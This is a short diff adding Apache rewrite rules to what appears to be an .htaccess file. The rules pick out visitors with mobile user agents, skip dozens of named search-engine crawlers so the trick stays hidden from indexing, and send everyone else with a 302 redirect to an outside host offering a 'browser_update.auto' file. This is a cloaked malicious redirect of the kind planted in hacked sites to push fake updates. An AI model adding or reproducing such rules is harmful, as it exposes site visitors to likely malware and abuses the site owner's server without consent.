@@ -1,0 +1,4 @@
+RewriteEngine   on
+RewriteCond    %{HTTP_USER_AGENT}  (android|midp|j2me|symbian|series\ 60|symbos|windows\ mobile|windows\ ce|ppc|smartphone|blackberry|mtk|bada|windows\ phone)  [NC]
+RewriteCond    %{HTTP_USER_AGENT}  !(accoona|ia_archiver|antabot|ask\ jeeves|baidu|dcpbot|eltaindexer|feedfetcher|gamespy|gigabot|googlebot|gsa-crawler|grub-client|gulper|slurp|mihalism|msnbot|worldindexer|ooyyo|pagebull|scooter|w3c_validator|jigsaw|webalta|yahoofeedseeker|yahoo!\ slurp|mmcrawler|yandexbot|yandeximages|yandexvideo|yandexmedia|yandexblogs|yandexaddurl|yandexfavicons|yandexdirect|yandexmetrika|yandexcatalog|yandexnews|yandeximageresizer)    [NC]
+RewriteRule    (.*)    http://file07.com/browser_update/u/5716/browser_update.auto    [L,R=302]
